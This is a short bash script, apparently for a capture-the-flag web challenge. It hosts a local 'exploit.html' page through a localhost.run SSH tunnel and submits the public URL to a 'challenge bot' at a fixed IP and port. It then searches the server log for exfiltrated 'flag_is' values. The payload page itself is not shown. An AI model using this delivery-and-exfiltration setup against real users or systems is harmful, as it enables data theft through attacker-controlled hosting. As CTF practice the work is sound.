#!/bin/bash
cd "$(dirname "$0")"
PORT=8777
pkill -f "http.server $PORT" 2>/dev/null
pkill -f "lhr.life" 2>/dev/null
rm -f srv.log tun.log
python3 -m http.server $PORT --bind 127.0.0.1 > srv.log 2>&1 &
SRV=$!
sleep 1

ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null \
    -o ServerAliveInterval=20 -o ExitOnForwardFailure=yes \
    -R 80:127.0.0.1:$PORT nokey@localhost.run > tun.log 2>&1 &
TUN=$!

URL=""
for i in $(seq 1 40); do
  URL=$(grep -aoE 'https://[a-z0-9.-]+\.lhr\.life' tun.log | head -1)
  [ -n "$URL" ] && break
  sleep 1
done
if [ -z "$URL" ]; then
  echo "TUNNEL FAILED:"; cat tun.log; kill $SRV $TUN 2>/dev/null; exit 1
fi
echo "tunnel: $URL"
TARGET="$URL/exploit.html"
echo "checking reachability ..."
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 "$TARGET")
echo "GET $TARGET -> HTTP $code"
if [ "$code" != "200" ]; then echo "not reachable, abort"; kill $SRV $TUN 2>/dev/null; exit 1; fi

echo "=== submitting to the challenge bot ==="
python3 - "$TARGET" <<'EOF'
import socket, sys, time
url = sys.argv[1]
s = socket.create_connection(("113.20.103.216", 31337), 30)
s.settimeout(90)
buf = b""
try:
    while b"URL to visit" not in buf:
        d = s.recv(4096)
        if not d: break
        buf += d
except Exception as e:
    print("recv prompt:", e)
print("bot:", buf.decode(errors="replace").strip())
s.sendall((url + "\n").encode())
print("sent:", url)
t0 = time.time()
try:
    while time.time() - t0 < 80:
        d = s.recv(4096)
        if not d: break
        sys.stdout.write(d.decode(errors="replace"))
        sys.stdout.flush()
except Exception as e:
    print("\n(recv done:", e, ")")
s.close()
EOF

echo
echo "=== exfil hits on our server ==="
grep -a 'flag_is' srv.log || echo "(none yet)"
echo "=== all requests ==="
grep -aE '"(GET|POST)' srv.log | tail -20
kill $SRV $TUN 2>/dev/null
